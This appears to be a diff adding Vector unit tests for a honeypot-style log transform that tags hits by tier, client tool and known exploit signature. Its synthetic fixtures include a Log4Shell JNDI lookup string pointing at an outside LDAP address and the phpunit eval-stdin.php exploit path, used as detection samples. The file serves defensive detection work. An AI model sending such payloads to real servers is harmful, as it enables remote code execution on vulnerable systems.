@@ -1,0 +1,86 @@
+# Vector unit tests for vector.toml's hits transform.
+#
+# Fixtures are synthetic, modelled on receiver.py's JsonlSink output (the
+# row/event dict built in Receiver.capture), never production data.
+# Addresses are from documentation ranges (RFC 5737 203.0.113.0/24).
+
+# H1: baseline. A plain, current-format hit still resolves its tier name and
+# names the tool from a recognised user agent.
+[[tests]]
+name = "h1_baseline_hit"
+
+  [[tests.inputs]]
+  insert_at = "hits"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:00:00+00:00","tier":0,"placement":"robots","agent_self":false,"method":"GET","path":"/static/img/logo.png","query":"","ip":"203.0.113.30","user_agent":"curl/8.4.0","headers":{},"body_len":0,"body_excerpt":"","depth":0,"delay_ms":0,"canary":false,"id":"h1"}'''
+
+  [[tests.outputs]]
+  extract_from = "hits"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.tier_name == "render-or-cover")
+    assert!(.threat.tool == "curl")
+    '''
+
+# H2: a phpunit eval-stdin.php path is named as a signature.
+[[tests]]
+name = "h2_phpunit_path_needle"
+
+  [[tests.inputs]]
+  insert_at = "hits"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:01:00+00:00","tier":4,"placement":"probe","agent_self":false,"method":"GET","path":"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","query":"","ip":"203.0.113.31","user_agent":"Go-http-client/1.1","headers":{},"body_len":0,"body_excerpt":"","depth":0,"delay_ms":0,"canary":false,"id":"h2"}'''
+
+  [[tests.outputs]]
+  extract_from = "hits"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.tier_name == "probe")
+    assert!(array!(.threat.exploit) == ["phpunit-cve-2017-9841"])
+    '''
+
+# H3: a log4shell string in the posted body is named as a signature even
+# though the path itself is plain.
+[[tests]]
+name = "h3_log4shell_in_body_excerpt"
+
+  [[tests.inputs]]
+  insert_at = "hits"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:02:00+00:00","tier":3,"placement":"collector","agent_self":false,"method":"POST","path":"/","query":"","ip":"203.0.113.32","user_agent":"Mozilla/5.0","headers":{},"body_len":40,"body_excerpt":"${jndi:ldap://198.51.100.5/a}","depth":0,"delay_ms":0,"canary":false,"id":"h3"}'''
+
+  [[tests.outputs]]
+  extract_from = "hits"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.tier_name == "collection-post")
+    assert!(array!(.threat.exploit) == ["log4shell-cve-2021-44228"])
+    '''
+
+# H4: hostile types on the fallible fields -- path absent entirely,
+# body_excerpt a number instead of a string. drop_on_error = true on this
+# transform too, so this proves the event survives rather than vanishing.
+[[tests]]
+name = "h4_hostile_types_not_dropped"
+
+  [[tests.inputs]]
+  insert_at = "hits"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:03:00+00:00","tier":4,"placement":"probe","agent_self":false,"method":"GET","query":"","ip":"203.0.113.33","user_agent":"Mozilla/5.0","headers":{},"body_len":5,"body_excerpt":12345,"depth":0,"delay_ms":0,"canary":false,"id":"h4"}'''
+
+  [[tests.outputs]]
+  extract_from = "hits"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.event.dataset == "tripwire.hits")
+    assert!(.tier_name == "probe")
+    assert!(!exists(.threat.exploit))
+    '''
